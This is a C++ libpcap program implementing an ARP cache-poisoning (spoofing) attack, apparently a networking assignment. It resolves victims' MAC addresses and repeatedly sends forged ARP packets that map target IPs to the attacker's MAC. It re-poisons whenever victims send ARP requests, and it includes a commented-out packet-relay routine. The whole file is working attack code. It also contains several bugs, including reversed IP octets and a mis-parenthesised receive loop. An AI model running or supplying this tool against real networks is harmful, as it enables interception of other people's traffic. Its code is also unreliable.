#include <cstdio>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include <unistd.h>
#include <map>
#include <set>
#include <vector>
#include <queue>
#include <thread>
#include <mutex>
#include <optional>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


std::map<Ip, Mac> sender_mac_list;
std::multimap<Ip, Ip> sender_to_target;
std::multimap<Ip, Ip> target_to_sender;


namespace My{
    char* get_my_mac(const char* ifname) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Failed to create socket");
        return NULL;
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("Failed to get MAC address");
        close(sockfd);
        return NULL;
    }

    close(sockfd);

    char* mac_str = (char*)malloc(18);
    unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    snprintf(mac_str, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    return mac_str;
}


    char* get_my_ip(const char* ifname) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Failed to create socket");
        return NULL;
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        perror("Failed to get IP address");
        close(sockfd);
        return NULL;
    }

    close(sockfd);

    struct sockaddr_in* ip_addr = (struct sockaddr_in*)&ifr.ifr_addr;
    char* ip_str = (char*)malloc(16);
    unsigned char* ip = (unsigned char*)&ip_addr->sin_addr.s_addr;
    snprintf(ip_str, 16, "%d.%d.%d.%d", ip[3], ip[2], ip[1], ip[0]);

    return ip_str;
}
}


void send_arp(pcap_t* handle, Mac my_mac, Mac s_mac, Ip s_ip, Ip t_ip)
{
	EthArpPacket packet;
	
	packet.eth_.dmac_ = s_mac;
	packet.eth_.smac_ = my_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = my_mac;
	packet.arp_.sip_ = htonl(s_ip);
	packet.arp_.tmac_ = (s_mac == Mac("ff:ff:ff:ff:ff:ff")) ? Mac("00:00:00:00:00:00") : s_mac;
	packet.arp_.tip_ = htonl(t_ip);
	
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return;
	}
}


Mac get_s_mac(pcap_t* handle, Mac my_mac, Ip my_ip, Ip s_ip)
{
	send_arp(handle, my_mac, Mac("ff:ff:ff:ff:ff:ff"), my_ip, s_ip);
	
	Mac s_mac;
	
	struct pcap_pkthdr* header;
    const u_char* packet_data;
    int i=0;
	while (int res = pcap_next_ex(handle, &header, &packet_data) >= 0) {
        if (res == 0) continue; 
        EthArpPacket* recv_packet = (EthArpPacket*)packet_data;
        if (recv_packet->eth_.type() == 0x0806 && recv_packet->arp_.op() == 2){
			s_mac = recv_packet->arp_.smac();
			break;
		}
    }

    return s_mac;
}


class arp_spoofing {
public:
    const Ip my_ip;
    const Mac my_mac;
private:
    pcap_t *handle;
    char* inf;
    std::queue<std::multimap<Ip, Ip>> work_que;
    std::mutex que_mutex;
public:
    arp_spoofing(pcap_t *_handle, char *_inf)
        : handle(_handle), inf(_inf),
          my_ip(My::get_my_ip(_inf)),  
          my_mac(My::get_my_mac(_inf)) 
    {
        
    }
    ~arp_spoofing() {
        pcap_close(handle);
    }

    void fill_work_que(const std::multimap<Ip, Ip>& source_map) {
        std::lock_guard<std::mutex> lock(que_mutex);
        work_que.push(source_map);
    }

    void process_work_que() {
        std::thread spoofing_thread(&arp_spoofing::send_spoofing, this);
        std::thread listening_thread(&arp_spoofing::capture_and_push_work_que, this);
        //std::thread tcp_capture_and_replay_thread(&arp_spoofing::tcp_capture_and_replay, this);
        spoofing_thread.join();
        listening_thread.join();
        //tcp_catpture_and_replay_thread.join();
    }

private:
    void send_spoofing() {
        while (true) {
            std::lock_guard<std::mutex> lock(que_mutex);
            if (work_que.empty()) {
                continue;
            }

            printf("Processing work queue item, queue size: %lu\n", work_que.size());

            std::multimap<Ip, Ip> current_map = work_que.front();
            work_que.pop();

            for (const auto& pair : current_map) {
                send_arp(this->handle, this->my_mac, sender_mac_list.at(pair.first),  pair.second, pair.first);
            }
        }
    }

    void capture_and_push_work_que() {
        struct pcap_pkthdr* header;
        const u_char* packet_data;

        while (true) {
            int res = pcap_next_ex(handle, &header, &packet_data);
            if (res == 0 || res == -1 || res == -2) {
                continue;
            }

            EthArpPacket* recv_packet = (EthArpPacket*)packet_data;
            Ip sender_ip = Ip(ntohl(recv_packet->arp_.sip_));
            Ip target_ip = Ip(ntohl(recv_packet->arp_.tip_));

            if (!(recv_packet->eth_.type() == EthHdr::Arp && recv_packet->arp_.op() == htons(ArpHdr::Request))) {
                return;
            }
            if (recv_packet->arp_.tmac_ == Mac::nullMac()) { // Broadcast
                if (sender_to_target.count(sender_ip) > 0) {
                    auto range = sender_to_target.equal_range(sender_ip);
                    std::multimap<Ip, Ip> temp_map;
                    for (auto it = range.first; it != range.second; ++it) {
                        temp_map.insert(*it);
                    }
                    fill_work_que(temp_map);
                } 
                if (target_to_sender.count(target_ip) > 0) {
                    auto range = target_to_sender.equal_range(target_ip);
                    std::multimap<Ip, Ip> temp_map;
                    for (auto it = range.first; it != range.second; ++it) {
                        temp_map.insert(*it);
                    }
                    fill_work_que(temp_map);
                }
            } else { // Unicast
                std::multimap<Ip, Ip> temp_map;
                temp_map.insert({sender_ip, target_ip});
                fill_work_que(temp_map);
            }
        }
    }
/*
    void tcp_capture_and_replay() {
        struct pcap_pkthdr* header;
        const u_char* packet_data;

        while (true) {
            int res = pcap_next_ex(handle, &header, &packet_data);
            if (res == 0 || res == -1 || res == -2) {
                continue;
            }
            EthHdr* eth = (EthHdr*)packet_data;
            if (eth->type() == EthHdr::Ip4) {
                IpHdr* ip = (IpHdr*)(packet_data + sizeof(EthHdr));
                if (ip->p_ == IPPROTO_TCP) {
                    TcpHdr* tcp = (TcpHdr*)(packet_data + sizeof(EthHdr) + ip->h_len() * 4);
                    pcap_sendpacket(handle, packet_data, header->caplen);
                }
            }
        }
    }*/
};

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) { 
        return -1;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    arp_spoofing arp(handle, dev); 

    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i + 1]);  
        printf("%d\n", i);
        sender_to_target.insert(std::make_pair(sender_ip, target_ip));
        target_to_sender.insert(std::make_pair(target_ip, sender_ip)); 
        
        auto it = sender_mac_list.find(sender_ip);
        if (it == sender_mac_list.end()) {
            Mac sender_mac = get_s_mac(handle, arp.my_mac, arp.my_ip, sender_ip);
            sender_mac_list.insert(std::make_pair(sender_ip, sender_mac));
        } else {
            continue;
        }
    }
    
    arp.fill_work_que(sender_to_target);

    arp.process_work_que();

    pcap_close(handle);
    return 0;
}